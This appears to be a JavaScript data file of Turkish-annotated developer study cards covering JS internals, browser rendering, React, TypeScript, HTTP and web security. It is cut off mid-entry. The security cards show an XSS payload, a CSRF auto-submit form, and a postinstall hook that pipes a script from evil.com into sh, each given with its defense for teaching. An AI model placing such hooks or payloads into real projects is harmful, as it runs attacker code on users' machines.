/**
 * Development — kart usulü geliştirme notları.
 *
 * Not eklemek `/dev` skill'i ile yapılır: skill notu analiz eder, türünü ve
 * etiketlerini belirler, aşağıdaki `notes` dizisinin BAŞINA ekler (en yeni üstte).
 *
 * Stil kuralı: body KISA tutulur (2-4 cümle, Türkçe) — asıl anlatım kod
 * bloklarındaki İNGİLİZCE yorumlarla taşınır. Kod okunarak mekanizma
 * anlaşılabilmeli; body sadece bağlamı verir, tekrar etmez.
 *
 * Her not:
 *   id       : benzersiz slug (kebab-case)
 *   type     : 'qa' | 'note' | 'konu'   → kartın görünümünü belirler
 *   title    : kısa başlık; 'qa' için bu SORU olur
 *   summary  : KARTTA görünen 1-2 cümlelik öz
 *   body     : MODALDA görünen KISA bağlam (2-4 cümle). Detay kodda.
 *   tags     : 1-3 etiket (küçük harf) — TAGS listesinden seçilir
 *   code     : kod bloğu dizisi, yorumlar İNGİLİZCE:
 *              [{ label: 'Problem', lang: 'jsx', snippet: '...' }, ...]
 *   source   : opsiyonel kaynak/link metni
 *   pinned   : true ise kart her görünümde EN ÜSTTE, vurgulu gösterilir
 *              (/pin skill'i ile açılıp kapanır)
 */

export const title = 'Development'
export const subtitle = 'Geliştirme notları, sorular ve konular'

/** Kanonik etiket listesi — skill yeni etiket uydurmaz, buradan seçer.
 *  Gerçekten yeni bir alan çıkarsa buraya eklenir. */
export const TAGS = [
  'javascript',
  'typescript',
  'react',
  'nextjs',
  'css',
  'tasarım',
  'performans',
  'erişilebilirlik',
  'test',
  'git',
  'araçlar',
  'backend',
  'veritabanı',
  'ai',
  'güvenlik',
  'tarayıcı',
  'mimari',
  'kariyer',
]

export const notes = [
  // ─── Katman 3: JS Motoru ve Çalışma Zamanı ───
  {
    id: 'prototype-this-nedir',
    type: 'qa',
    title: 'Prototype zinciri ve this nasıl çalışır?',
    summary:
      'Bulunamayan özellik [[Prototype]] zincirinde yukarı aranır. this çağrı ŞEKLİNE bağlanır, tanım yerine değil.',
    body: 'Arrow function\'ın kendi this\'i yoktur, çevreleyeni kapatır. Regular function\'da this, kim çağırdıysa odur — receiver kaybolursa this de kaybolur.',
    tags: ['javascript'],
    code: [
      {
        label: 'Prototype chain lookup',
        lang: 'js',
        snippet: `const animal = { speak() { return 'sound' } }
const dog = Object.create(animal)

dog.speak() // 'sound' — not found on dog, found on animal via [[Prototype]]
dog.hasOwnProperty('speak') // false — it's inherited, not own`,
      },
      {
        label: 'this depends on the CALL, not the definition',
        lang: 'js',
        snippet: `const obj = {
  name: 'obj',
  regular() { return this.name },  // this = whoever calls it
  arrow: () => this?.name,          // this = enclosing scope, NOT obj
}

obj.regular() // 'obj'

const fn = obj.regular
fn() // undefined — called without a receiver, this is lost

obj.arrow() // undefined — arrow never had its own this`,
      },
    ],
  },

  {
    id: 'garbage-collection-nedir',
    type: 'qa',
    title: "JavaScript'te garbage collection nasıl çalışır?",
    summary:
      "Mark-and-sweep: kökten erişilemeyen her şey çöptür. Referans sayısına değil ERİŞİLEBİLİRLİĞE bakılır.",
    body: 'Unutulan bir event listener ya da closure, kapattığı objeyi sonsuza dek canlı tutabilir — bu bellek sızıntısının en yaygın şeklidir.',
    tags: ['javascript', 'performans'],
    code: [
      {
        label: 'Leak — listener never released',
        lang: 'js',
        snippet: `function attach() {
  const bigData = new Array(1_000_000).fill('x')
  window.addEventListener('resize', () => {
    console.log(bigData.length) // closure keeps bigData alive forever
  })
}
attach()
// bigData is unreachable from your code, but the listener
// closure holds it — GC can never collect it.`,
      },
      {
        label: 'Fix — remove the reference explicitly',
        lang: 'js',
        snippet: `function attach() {
  const bigData = new Array(1_000_000).fill('x')
  const onResize = () => console.log(bigData.length)
  window.addEventListener('resize', onResize)
  return () => window.removeEventListener('resize', onResize)
}
const cleanup = attach()
cleanup() // listener gone -> closure gone -> bigData collectible`,
      },
    ],
  },

  {
    id: 'esm-cjs-farki',
    type: 'qa',
    title: 'ESM ile CJS farkı neden hâlâ sorun çıkarır?',
    summary:
      'CJS senkron ve dinamiktir (require her yerde çağrılabilir); ESM statik analiz edilir. İkisi karışınca interop hataları çıkar.',
    body: "ESM import'ları dosyanın EN ÜSTÜNDE, statik olmalı — bu sayede tree-shaking mümkün olur. CJS'te bu garanti yoktur.",
    tags: ['javascript', 'araçlar'],
    code: [
      {
        label: 'CJS — dynamic, runtime-resolved',
        lang: 'js',
        snippet: `// can be called conditionally, anywhere in the file
if (process.env.NODE_ENV === 'dev') {
  const debug = require('./debug')
  debug.enable()
}
module.exports = { foo: 1 }`,
      },
      {
        label: 'ESM — static, compile-time resolved',
        lang: 'js',
        snippet: `// must be top-level — bundler resolves this BEFORE running any code
import { foo } from './foo.js'

// dynamic import is the escape hatch, returns a Promise
if (condition) {
  const { debug } = await import('./debug.js')
}

export const bar = 1
// Static shape is what makes tree-shaking possible: the bundler
// can see exactly what's imported/exported, at build time.`,
      },
    ],
  },

  // ─── Katman 2: Tarayıcının İç Yapısı ───
  {
    id: 'render-pipeline-nedir',
    type: 'qa',
    title: "Tarayıcı render pipeline'ı: style → layout → paint → composite",
    summary:
      'HTML→DOM, CSS→CSSOM, ikisi birleşip render tree olur. Sonra layout, paint, composite sırayla çalışır.',
    body: 'Her aşama bir öncekine bağımlı — hangi CSS özelliğinin nereden başladığı performansı belirler.',
    tags: ['css', 'performans'],
    code: [
      {
        label: 'The four stages',
        lang: 'js',
        snippet: `// 1. HTML -> DOM tree
// 2. CSS  -> CSSOM tree
// 3. DOM + CSSOM -> Render tree (visible nodes + computed styles)
// 4. Layout    — compute position/size of every box
// 5. Paint     — fill in pixels (color, text, shadows) per layer
// 6. Composite — combine layers on the GPU into the final frame
//
// Changing a property re-enters this pipeline at different points:
// - width/top/font-size          -> Layout -> Paint -> Composite (expensive)
// - background-color/box-shadow  -> Paint -> Composite
// - transform/opacity            -> Composite only (cheapest, GPU-only)`,
      },
    ],
  },

  {
    id: 'reflow-repaint-farki',
    type: 'qa',
    title: 'Reflow (layout) ile repaint farkı nedir, hangi CSS neyi tetikler?',
    summary:
      'Reflow: geometri yeniden hesaplanır, pahalı ve komşulara yayılır. Repaint: görünüm değişir, geometri sabit kalır.',
    body: "Animasyon için transform ve opacity tercih edilir çünkü ikisi de Composite aşamasında kalır — Layout'a hiç girmez.",
    tags: ['css', 'performans'],
    code: [
      {
        label: 'Triggers layout (reflow) — expensive',
        lang: 'css',
        snippet: `.box {
  width: 200px;   /* changes geometry -> reflow -> repaint -> composite */
  top: 10px;
  font-size: 18px;
}`,
      },
      {
        label: 'Composite-only — cheapest, GPU-accelerated',
        lang: 'css',
        snippet: `.box {
  transform: translateX(10px); /* no layout, no paint — just moves a layer */
  opacity: 0.5;                /* same — composite-only */
}
/* This is why "animate transform, not left/top" is the rule. */`,
      },
    ],
  },

  {
    id: 'critical-rendering-path',
    type: 'qa',
    title: "Critical rendering path nedir, script neden render'ı bloklar?",
    summary:
      "Tarayıcı ilk boyayı yapmadan önce DOM + CSSOM'un tamamlanmasını bekler. Head'deki senkron <script>, parser'ı durdurur.",
    body: "defer/async, script indirmeyi paralel yaparak bu bloklamayı kırar. CSS her zaman render-blocking'tir.",
    tags: ['css', 'performans'],
    code: [
      {
        label: 'Blocking vs non-blocking script loading',
        lang: 'html',
        snippet: `<!-- blocks HTML parsing until this downloads AND runs -->
<script src="analytics.js"></script>

<!-- downloads in parallel, runs in order, after parsing -->
<script src="app.js" defer></script>

<!-- downloads in parallel, runs IMMEDIATELY when ready (any order) -->
<script src="widget.js" async></script>`,
      },
    ],
  },

  // ─── Katman 5: Framework Mekaniği ───
  {
    id: 'react-fiber-nedir',
    type: 'qa',
    title: 'Fiber mimarisi hangi problemi çözüyor?',
    summary:
      "Eski reconciler render'ı bölemezdi, büyük ağaç ana thread'i kilitlerdi. Fiber, render işini KESİLEBİLİR birimlere böler.",
    body: "Fiber her bileşen için bir iş birimidir; React bir kısmını render edip kontrolü tarayıcıya geri verebilir. Concurrent özelliklerin (useTransition) temeli budur.",
    tags: ['react', 'performans'],
    code: [
      {
        label: 'What interruptible rendering enables',
        lang: 'js',
        snippet: `// Old (stack) reconciler: rendering 10,000 items = one long,
// synchronous call stack. The browser can't paint or respond
// to input until it fully unwinds.

// Fiber reconciler: work is split into units, one per fiber node.
// React can pause after any unit, let the browser handle an
// urgent event (a keystroke), then resume — without restarting.

startTransition(() => {
  setResults(expensiveFilter(hugeList)) // marked LOW priority,
})                                       // can be interrupted
setQuery(input.value)                    // stays HIGH priority`,
      },
    ],
  },

  {
    id: 'react-key-rolu',
    type: 'qa',
    title: 'key prop\'u reconciliation\'da tam olarak ne yapar?',
    summary:
      "key, React'e 'bu eleman hangisi' der. Aynı key = aynı bileşen örneği; değişen key = eski unmount, yeni mount.",
    body: "index'i key yapmak, liste sırası değişince state'in yanlış satıra yapışmasına yol açar — React 'aynı pozisyon = aynı eleman' sanır.",
    tags: ['react'],
    code: [
      {
        label: 'index as key — state sticks to the wrong row',
        lang: 'jsx',
        snippet: `{items.map((item, index) => (
  // if items are reordered/filtered, index 0 might now be a
  // DIFFERENT item — but React reuses the same instance,
  // so any local state (like an open <input>) stays put
  <TodoRow key={index} item={item} />
))}`,
      },
      {
        label: 'stable id as key — correct identity',
        lang: 'jsx',
        snippet: `{items.map((item) => (
  // key follows the DATA, not the position —
  // reordering now correctly remounts/moves the right instance
  <TodoRow key={item.id} item={item} />
))}`,
      },
    ],
  },

  {
    id: 'render-stratejileri-csr-ssr-ssg-isr-rsc',
    type: 'qa',
    title: 'CSR, SSR, SSG, ISR, RSC arasındaki ödünleşim nedir?',
    summary:
      "Hepsi 'HTML ne zaman ve nerede üretiliyor' sorusuna farklı cevap verir. Erken üretim hız, geç üretim tazelik kazandırır.",
    body: "RSC farklı: HTML değil, serileştirilmiş bir ağaç gönderir ve client bundle'a hiç girmez.",
    tags: ['nextjs', 'mimari'],
    code: [
      {
        label: 'Where and when HTML gets built',
        lang: 'js',
        snippet: `// CSR: browser fetches empty HTML + JS, renders client-side.
//   Fast to deploy, slow first paint, bad for SEO without extra work.

// SSR: server renders HTML on EVERY request.
export async function getServerSideProps() { /* runs per request */ }

// SSG: HTML built ONCE at build time, served from CDN.
export async function getStaticProps() { /* runs at build time */ }

// ISR: SSG + "revalidate after N seconds".
export async function getStaticProps() {
  return { props: {}, revalidate: 60 } // rebuild at most once/60s
}

// RSC: component runs ONLY on the server, ships zero JS to the client.
async function Page() {
  const data = await db.query() // no client-side fetch, no bundle cost
  return <List data={data} />
}`,
      },
    ],
  },

  {
    id: 'hydration-nedir',
    type: 'qa',
    title: 'Hydration nedir, neden pahalıdır?',
    summary:
      "Sunucudan gelen statik HTML'i React'in event listener'larla 'canlandırma' işlemi. Tüm ağacı yeniden render edip DOM'la eşleştirmek gerekir.",
    body: "Sayfa GÖRÜNÜR ama TIKLANAMAZ olduğu ara dönem buradan gelir — hydration bitmeden handler'lar bağlı değildir.",
    tags: ['react', 'nextjs', 'performans'],
    code: [
      {
        label: 'The gap hydration creates',
        lang: 'js',
        snippet: `// 1. Server sends fully-rendered HTML -> user sees content immediately
// 2. Browser downloads the JS bundle (can take seconds on slow connections)
// 3. React re-renders the same tree client-side, attaches event handlers
// 4. ONLY NOW are onClick/onChange etc. actually wired up
//
// Between step 1 and step 3: the button is visible but does nothing
// when clicked. That gap is what "Time to Interactive" measures.`,
      },
    ],
  },

  // ─── Katman 6: Veri ve State Mimarisi ───
  {
    id: 'cache-invalidation-nedir',
    type: 'qa',
    title: "Cache invalidation: bir mutation'dan sonra ne tazelenmeli?",
    summary:
      'İlgili query\'leri elle işaretle (invalidate) — mutation hangi key\'leri etkiliyorsa onlar tazelenir.',
    body: "Query key bir bağımlılık listesi gibi düşünülür. Yanlış kapsam ya bayat veri bırakır ya gereksiz yeniden çeker.",
    tags: ['react', 'mimari'],
    code: [
      {
        label: 'Invalidate exactly what the mutation affects',
        lang: 'js',
        snippet: `const queryClient = useQueryClient()

const { mutate } = useMutation({
  mutationFn: (todo) => api.createTodo(todo),
  onSuccess: () => {
    // this mutation changes the todo LIST, so only that cache entry
    // is stale — the user's profile query, for example, is untouched
    queryClient.invalidateQueries({ queryKey: ['todos'] })
  },
})`,
      },
    ],
  },

  {
    id: 'optimistic-update-rollback',
    type: 'qa',
    title: 'Optimistic update nasıl kurgulanır, hata olursa geri alma?',
    summary:
      "UI'ı sunucu cevabını beklemeden güncelle, hata dönerse önceki değere geri sar.",
    body: 'Kritik nokta: eski değeri mutation başlamadan ÖNCE sakla — hata durumunda dönecek referans odur.',
    tags: ['react', 'mimari'],
    code: [
      {
        label: 'Update immediately, roll back on failure',
        lang: 'js',
        snippet: `const { mutate } = useMutation({
  mutationFn: (newTitle) => api.updateTodo(id, newTitle),

  onMutate: async (newTitle) => {
    await queryClient.cancelQueries({ queryKey: ['todo', id] })
    const previous = queryClient.getQueryData(['todo', id]) // snapshot BEFORE

    queryClient.setQueryData(['todo', id], (old) => ({ ...old, title: newTitle }))
    return { previous } // passed to onError as context
  },

  onError: (err, newTitle, context) => {
    queryClient.setQueryData(['todo', id], context.previous) // roll back
  },

  onSettled: () => queryClient.invalidateQueries({ queryKey: ['todo', id] }),
})`,
      },
    ],
  },

  {
    id: 'state-normalizasyonu',
    type: 'qa',
    title: 'State normalizasyonu nedir, neden gerekir?',
    summary:
      "Aynı entity'yi iki listede iki kopya tutarsan, biri güncellenince diğeri bayat kalır. Normalizasyon: her entity TEK yerde.",
    body: 'İlişkisel veritabanı mantığı: id\'ye göre bir map + referans listeleri. Bir obje bir kere güncellenir, onu gösteren her yer otomatik doğru olur.',
    tags: ['mimari'],
    code: [
      {
        label: 'Denormalized — two copies drift apart',
        lang: 'js',
        snippet: `const state = {
  activeUsers: [{ id: 1, name: 'Ada', online: true }],
  allUsers: [{ id: 1, name: 'Ada', online: true }], // duplicate copy
}
// update "Ada" in one list -> the other still shows stale data`,
      },
      {
        label: 'Normalized — one source per entity',
        lang: 'js',
        snippet: `const state = {
  users: { 1: { id: 1, name: 'Ada', online: true } }, // single copy
  activeUserIds: [1],
  allUserIds: [1],
}
// update state.users[1] ONCE -> every list that references id 1
// reads the updated object automatically`,
      },
    ],
  },

  {
    id: 'realtime-veri-cache-entegrasyonu',
    type: 'qa',
    title: 'WebSocket/realtime veri, cache tabanlı state modeline nasıl entegre edilir?',
    summary:
      "Sunucu push'unu mutation gibi ele al: gelen event'i doğrudan query cache'ine yaz, ayrı bir 'realtime state' açma.",
    body: 'İki kaynağı (fetch + socket) ayrı tutarsan senkronizasyon derdi geri gelir. Tek doğruluk kaynağı: cache.',
    tags: ['react', 'mimari', 'backend'],
    code: [
      {
        label: 'Socket event writes directly into the query cache',
        lang: 'js',
        snippet: `useEffect(() => {
  const socket = new WebSocket('wss://api.example.com/todos')

  socket.onmessage = (event) => {
    const updatedTodo = JSON.parse(event.data)
    // write into the SAME cache useQuery reads from —
    // no separate "realtime state" to keep in sync
    queryClient.setQueryData(['todo', updatedTodo.id], updatedTodo)
  }

  return () => socket.close()
}, [queryClient])`,
      },
    ],
  },

  // ─── Katman 1: Ağ ve Web Platformu ───
  {
    id: 'url-enter-sonrasi-ne-olur',
    type: 'qa',
    title: "Adres çubuğuna URL yazıp Enter'a basınca ne olur?",
    summary:
      'DNS ile IP bulunur, TCP (+TLS) el sıkışması bağlantı kurar, tarayıcı HTTP isteği yollar, sunucu yanıtlar.',
    body: "Bu zincirin her adımı gecikme ekler — 'site yavaş' teşhisi hep buradan başlar.",
    tags: ['tarayıcı'],
    code: [
      {
        label: 'The sequence, roughly',
        lang: 'bash',
        snippet: `1. DNS lookup       example.com -> 93.184.216.34   (cached after first time)
2. TCP handshake    SYN -> SYN-ACK -> ACK           (1 round trip)
3. TLS handshake    if https:// — negotiate keys    (1-2 more round trips)
4. HTTP request     GET / HTTP/1.1
5. Server responds  HTML (+ headers: cache, cookies)
6. Browser parses   builds DOM/CSSOM, requests CSS/JS/images
7. Render           paints the first frame

# Each round trip costs real latency — this is why CDNs (closer
# server), HTTP/2 multiplexing, and connection reuse all exist.`,
      },
    ],
  },

  {
    id: 'http-1-2-3-farklari',
    type: 'qa',
    title: 'HTTP/1.1, HTTP/2, HTTP/3 arasındaki fark neden önemli?',
    summary:
      '1.1: her istek ayrı bağlantı ister. 2: tek bağlantıda çoklama. 3: UDP tabanlı QUIC, paket kaybını izole eder.',
    body: "HTTP/2'nin çoklaması TCP paket kaybında hâlâ tıkanır — HTTP/3 bunu QUIC ile çözer, her stream bağımsız.",
    tags: ['tarayıcı'],
    code: [
      {
        label: 'Why HTTP/1.1 needed workarounds',
        lang: 'bash',
        snippet: `# HTTP/1.1: one request per connection at a time (per origin,
# browsers open ~6 parallel connections as a workaround)
GET /style.css   -> waits
GET /app.js      -> waits for style.css to finish (same connection)

# HTTP/2: multiple requests MULTIPLEXED over ONE connection —
# no more 6-connection hack needed, no head-of-line blocking at
# the HTTP layer (but still possible at the TCP layer)

# HTTP/3: same multiplexing, but over QUIC (UDP) — one lost
# packet only stalls ITS OWN stream, not every stream sharing
# the connection`,
      },
    ],
  },

  {
    id: 'http-cache-control-etag-cdn',
    type: 'qa',
    title: "Cache-Control ve ETag nasıl çalışır, CDN'in rolü ne?",
    summary:
      'Cache-Control: ne kadar süre hiç sormadan kullan. ETag: içerik parmak izi — değişmediyse sunucu 304 döner.',
    body: "CDN, coğrafi olarak uzak kullanıcı için origin'e gitmeden önbellekten yanıtlar — tüm gecikme zincirini atlar.",
    tags: ['tarayıcı', 'performans'],
    code: [
      {
        label: 'Fresh vs revalidated vs re-downloaded',
        lang: 'bash',
        snippet: `# max-age: browser uses the cached copy WITHOUT asking, for 1 hour
Cache-Control: max-age=3600

# no-cache: browser MUST ask ("is this still valid?") every time,
# but can skip re-downloading the body if the server says yes
Cache-Control: no-cache
ETag: "33a64df5"

# Revalidation request:
GET /app.js
If-None-Match: "33a64df5"

# Server: content unchanged -> 304, no body sent, browser reuses cache
# Server: content changed   -> 200, new body + new ETag`,
      },
    ],
  },

  {
    id: 'cookie-samesite',
    type: 'qa',
    title: "SameSite cookie ayarı ne işe yarar, CSRF ile ilişkisi ne?",
    summary:
      "SameSite=Strict/Lax, cookie'nin cross-site isteklerde gönderilip gönderilmeyeceğini belirler.",
    body: 'Lax varsayılandır: üst düzey navigasyonlarda gider ama başka sitenin arka planda attığı POST\'ta gitmez.',
    tags: ['güvenlik', 'tarayıcı'],
    code: [
      {
        label: 'The three SameSite values',
        lang: 'bash',
        snippet: `# Strict: cookie NEVER sent cross-site, even clicking a link from Google
Set-Cookie: session=abc; SameSite=Strict

# Lax (default in modern browsers): sent on top-level navigation
# (clicking a link), but NOT on cross-site POST/fetch/img requests —
# this alone blocks most classic CSRF attacks
Set-Cookie: session=abc; SameSite=Lax

# None: sent everywhere, cross-site included — requires Secure (https)
Set-Cookie: session=abc; SameSite=None; Secure`,
      },
    ],
  },

  // ─── Katman 7: Güvenlik ───
  {
    id: 'xss-turleri-react-korumasi',
    type: 'qa',
    title: "XSS türleri nelerdir, React nereden koruyup nereden korumaz?",
    summary:
      "React, {value} ile render edilen her şeyi otomatik kaçışlar. dangerouslySetInnerHTML ve href bu korumanın DIŞINDA.",
    body: "Stored XSS: kötü script veritabanına yazılıp herkese servis edilir. Reflected: URL parametresi doğrudan sayfaya yazılır.",
    tags: ['güvenlik', 'react'],
    code: [
      {
        label: 'Safe by default — React escapes text',
        lang: 'jsx',
        snippet: `const name = '<img src=x onerror=alert(1)>'
return <div>{name}</div>
// Renders as literal text: "<img src=x onerror=alert(1)>"
// NOT as a real <img> tag — React escaped it automatically.`,
      },
      {
        label: 'Two places React does NOT protect you',
        lang: 'jsx',
        snippet: `// 1. dangerouslySetInnerHTML — you're opting OUT of escaping
<div dangerouslySetInnerHTML={{ __html: userComment }} />
// if userComment contains a <script>, it runs. Sanitize first
// (e.g. DOMPurify) before this ever touches raw user input.

// 2. href with a javascript: URL — React won't stop this either
<a href={userProvidedUrl}>click</a>
// if userProvidedUrl = "javascript:alert(1)", it executes on click.
// Validate the protocol before rendering it as an href.`,
      },
    ],
  },

  {
    id: 'csrf-nedir-nasil-onlenir',
    type: 'qa',
    title: 'CSRF nedir, nasıl önlenir?',
    summary:
      'Kullanıcının tarayıcısı, oturum cookie\'siyle bilmeden başka bir siteden isteğini gönderir.',
    body: "SameSite=Lax çoğu vakayı önler ama tek başına yeterli sayılmaz — CSRF token hâlâ standart ikinci katmandır.",
    tags: ['güvenlik'],
    code: [
      {
        label: 'The attack — cookie is sent automatically',
        lang: 'html',
        snippet: `<!-- on evil-site.com, victim is logged into bank.com -->
<form action="https://bank.com/transfer" method="POST">
  <input name="amount" value="1000" />
  <input name="to" value="attacker" />
</form>
<script>document.forms[0].submit()</script>
<!-- browser attaches bank.com's session cookie automatically —
     the request looks legitimate to the server -->`,
      },
      {
        label: "Defense — a token the attacker can't guess",
        lang: 'js',
        snippet: `// server embeds a random token tied to the session
<input type="hidden" name="csrf_token" value="f3a9...">

// server rejects any state-changing request without a MATCHING token
// evil-site.com has no way to read this token (same-origin policy) —
// it can submit the form, but not with the right token attached`,
      },
    ],
  },

  {
    id: 'csp-nedir',
    type: 'qa',
    title: 'Content Security Policy (CSP) ne işe yarar?',
    summary:
      "Sayfanın hangi kaynaktan script/stil yükleyebileceğini beyaz listeye alır. XSS başarılı olsa bile izinsiz domain'den script çalıştıramaz.",
    body: 'Inline script\'leri varsayılan olarak engeller — bu XSS\'in en yaygın çalışma biçimini kapatır.',
    tags: ['güvenlik'],
    code: [
      {
        label: 'A CSP header in practice',
        lang: 'bash',
        snippet: `Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.example.com;
  img-src 'self' data: https:;
  object-src 'none'

# Even if an attacker injects <script src="evil.com/x.js">,
# the browser REFUSES to load or execute it — evil.com
# isn't in script-src's allow-list.`,
      },
    ],
  },

  {
    id: 'session-vs-jwt-oauth',
    type: 'qa',
    title: 'Session cookie ile JWT arasındaki fark nedir, OAuth nasıl işler?',
    summary:
      'Session: sunucu durumu tutar, istediğin an iptal edebilirsin. JWT: durum tokenın içinde, iptal etmesi zordur.',
    body: "OAuth bir kimlik doğrulama değil, YETKİLENDİRME protokolüdür — 'bu uygulama senin adına şunu yapabilir mi' sorusuna cevap verir.",
    tags: ['güvenlik', 'backend'],
    code: [
      {
        label: 'Session vs JWT — where state lives',
        lang: 'bash',
        snippet: `# Session: cookie just holds an opaque id
Set-Cookie: sid=x7f2a
# server: sessions["x7f2a"] = { userId: 42, role: "admin" }
# revoke instantly -> delete that server-side entry

# JWT: cookie/header holds the actual claims, signed
Authorization: Bearer eyJhbGciOi...
# server just verifies the signature — no lookup, no DB hit
# revoke BEFORE expiry -> hard; needs a denylist or short TTL + refresh`,
      },
    ],
  },

  {
    id: 'dependency-supply-chain-riskleri',
    type: 'qa',
    title: 'Dependency / supply-chain riski nedir, nasıl azaltılır?',
    summary:
      "node_modules'teki binlerce paket dolaylı bir güven zinciridir — birinin update'i kötü niyetli kod içerebilir.",
    body: "postinstall script'leri, typosquatting ve maintainer hesabı ele geçirme en yaygın vektörler.",
    tags: ['güvenlik', 'araçlar'],
    code: [
      {
        label: 'A postinstall script runs with your permissions',
        lang: 'json',
        snippet: `// package.json of a compromised dependency
{
  "scripts": {
    "postinstall": "curl https://evil.com/payload.sh | sh"
  }
}
// This runs automatically on npm install — no confirmation,
// with the same file-system access as the install itself.
// Defense: npm ci (locked versions), npm audit, and tools
// that block install scripts by default.`,
      },
    ],
  },

  // ─── Katman 8: Performans ve Ölçüm ───
  {
    id: 'core-web-vitals-nedir',
    type: 'qa',
    title: "Core Web Vitals (LCP, CLS, INP) her biri neyi ölçüyor?",
    summary:
      "LCP: en büyük içerik ne zaman göründü. CLS: sayfa ne kadar 'zıpladı'. INP: etkileşime tepki ne kadar sürdü.",
    body: "Üçü de 'kullanıcının hissettiği' deneyimi ölçer, ham yükleme süresini değil.",
    tags: ['performans'],
    code: [
      {
        label: 'What typically causes each one to fail',
        lang: 'js',
        snippet: `// LCP (Largest Contentful Paint) — target: < 2.5s
// Usually the hero image or headline. Fixed by: faster server
// response, preloading the image, removing render-blocking JS.

// CLS (Cumulative Layout Shift) — target: < 0.1
// An ad or image loads without reserved space, pushing content down.
<img src="hero.jpg" width="800" height="400" /> // dimensions reserve space

// INP (Interaction to Next Paint) — target: < 200ms
// A click handler running a heavy synchronous computation blocks
// the main thread, delaying the visual response to that click.`,
      },
    ],
  },

  {
    id: 'bundle-analizi-code-splitting',
    type: 'qa',
    title: 'Bundle analizi ve code splitting neyi çözer?',
    summary:
      "Tek büyük JS dosyası, kullanıcının ihtiyacı olmayan kodu da indirtir. Code splitting sadece gereken kodu ayırır.",
    body: 'Bundle analyzer, genelde beklenmedik bir bağımlılığın tamamının tek bir fonksiyonu için import edildiğini ortaya çıkarır.',
    tags: ['performans', 'araçlar'],
    code: [
      {
        label: 'Route-based and lazy code splitting',
        lang: 'jsx',
        snippet: `// without splitting: this heavy chart library ships to EVERY
// page, even ones that never render a chart
import HeavyChart from './HeavyChart'

// with splitting: chunk is only downloaded when this component
// actually renders — e.g. behind a tab the user might never open
const HeavyChart = lazy(() => import('./HeavyChart'))

function Dashboard() {
  return (
    <Suspense fallback={<Spinner />}>
      <HeavyChart />
    </Suspense>
  )
}`,
      },
    ],
  },

  {
    id: 'react-profiler-devtools-performance',
    type: 'qa',
    title: 'React Profiler ve DevTools Performance sekmesi nasıl okunur?',
    summary:
      'Performance: hangi kod ne kadar sürdü, hangi aşamada zaman gitti. Profiler: hangi bileşen kaç kere, neden render oldu.',
    body: "'Neden render oldu' sorusunun cevabı gözle görülmez — Profiler kaydı olmadan tahmin etmek zaman kaybıdır.",
    tags: ['performans', 'react'],
    code: [
      {
        label: 'Profiler API — measure without opening DevTools',
        lang: 'jsx',
        snippet: `import { Profiler } from 'react'

function onRender(id, phase, actualDuration) {
  // phase: "mount" | "update"
  // actualDuration: ms spent rendering this subtree THIS commit
  if (actualDuration > 16) {
    console.warn(\`\${id} took \${actualDuration}ms during \${phase}\`)
  }
}

<Profiler id="Dashboard" onRender={onRender}>
  <Dashboard />
</Profiler>`,
      },
    ],
  },

  // ─── Katman 4: Tip Sistemi ───
  {
    id: 'typescript-structural-typing',
    type: 'qa',
    title: "TypeScript'in structural typing mantığı nedir?",
    summary:
      "İsim değil ŞEKİL önemlidir — aynı alanlara sahip iki tip birbirinin yerine geçebilir.",
    body: "Java/C#'ın nominal type sisteminden farkı budur: TS 'bu obje şu şekle uyuyor mu' diye sorar, 'hangi sınıftan türedi' diye sormaz.",
    tags: ['typescript'],
    code: [
      {
        label: 'Shape matters, not declared identity',
        lang: 'ts',
        snippet: `interface Point { x: number; y: number }

function log(p: Point) { console.log(p.x, p.y) }

// never declared as "Point", but has the right SHAPE — this compiles
const coords = { x: 1, y: 2, z: 3 } // extra field is fine too
log(coords) // OK — structurally compatible`,
      },
    ],
  },

  {
    id: 'typescript-union-narrowing',
    type: 'qa',
    title: 'Union type ve narrowing nasıl çalışır?',
    summary:
      "Union: 'bu değer A ya da B olabilir' der. Narrowing: koşullu kontrollerle tipi kesinleştirme işlemi.",
    body: 'Narrowing sonrası derleyici o bloğun içinde tipi otomatik daraltır — ekstra tip belirtmene gerek kalmaz.',
    tags: ['typescript'],
    code: [
      {
        label: 'typeof — narrowing a union step by step',
        lang: 'ts',
        snippet: `type Value = string | number | { message: string }

function describe(v: Value) {
  if (typeof v === 'string') {
    return v.toUpperCase() // TS knows v is string HERE
  }
  if (typeof v === 'number') {
    return v.toFixed(2) // TS knows v is number HERE
  }
  return v.message // only { message: string } left — TS knows it
}`,
      },
    ],
  },

  {
    id: 'typescript-generics',
    type: 'qa',
    title: "Generics ne işe yarar, neden any'den daha iyidir?",
    summary:
      "any tip güvenliğini kapatır. Generic, giriş ile çıkış arasındaki tip ilişkisini KORUYARAK esnek kalır.",
    body: 'T bir yer tutucudur; çağrı anında gerçek tiple doldurulur ve derleyici o tipi izler.',
    tags: ['typescript'],
    code: [
      {
        label: 'any loses the relationship, generics keep it',
        lang: 'ts',
        snippet: `function firstAny(arr: any[]): any {
  return arr[0]
}
const x = firstAny([1, 2, 3]) // x is "any" — no autocomplete, no safety

function first<T>(arr: T[]): T {
  return arr[0]
}
const y = first([1, 2, 3])  // y is inferred as "number"
const z = first(['a', 'b']) // z is inferred as "string"
// the INPUT type flows through to the OUTPUT type automatically`,
      },
    ],
  },

  {
    id: 'typescript-tip-cikarimi',
    type: 'qa',
    title: 'TypeScript tip çıkarımı (inference) nasıl çalışır?',
    summary:
      "Her yere tip yazmana gerek yok — TS, atadığın değerden ve bağlamdan tipi kendi çıkarır.",
    body: "Contextual typing: bir callback'in parametre tipini, geçirildiği fonksiyonun imzasından çıkarır.",
    tags: ['typescript'],
    code: [
      {
        label: 'Inference without any type annotation',
        lang: 'ts',
        snippet: `let count = 5         // inferred: number
count = 'five'         // Error — TS locked in "number" from the initial value

const nums = [1, 2, 3] // inferred: number[]

// Contextual typing: TS infers "n" is a number from Array.map's
// signature — you never wrote ": number" anywhere
nums.map((n) => n * 2)`,
      },
    ],
  },

  // ─── Katman 9: Tooling'in İçi ───
  {
    id: 'bundler-ast-tree-shaking',
    type: 'qa',
    title: "Bundler'lar gerçekte ne yapıyor: AST, transpile, tree shaking?",
    summary:
      "Kodu metin değil AĞAÇ (AST) olarak okur, dönüştürür, kullanılmayan export'ları eler, tek dosyaya paketler.",
    body: "Tree shaking, statik ESM import/export yapısına dayanır — CJS'te çok daha zayıf çalışır.",
    tags: ['araçlar'],
    code: [
      {
        label: 'Why unused exports get removed',
        lang: 'js',
        snippet: `// utils.js
export function used() { return 1 }
export function unused() { return 2 } // never imported anywhere

